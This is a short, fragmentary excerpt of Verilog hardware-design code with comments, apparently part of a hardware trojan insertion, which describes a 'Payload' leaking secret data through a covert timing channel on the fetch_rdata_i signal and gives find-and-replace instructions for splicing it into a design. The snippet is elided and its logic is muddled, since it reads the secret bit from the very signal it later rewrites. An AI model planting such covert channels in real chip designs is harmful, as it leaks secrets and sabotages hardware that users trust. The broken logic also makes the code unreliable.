 ...
 * Payload: Modulate timing of fetch_rdata_i based on secret data
 * 
...
assign secret_bit = fetch_rdata_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of fetch_rdata_i
//
// Integration Script Must Modify:
//
// IF fetch_rdata_i is timing-sensitive:
//   Find: assign fetch_rdata_i = ready_signal;
//   Replace: assign fetch_rdata_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
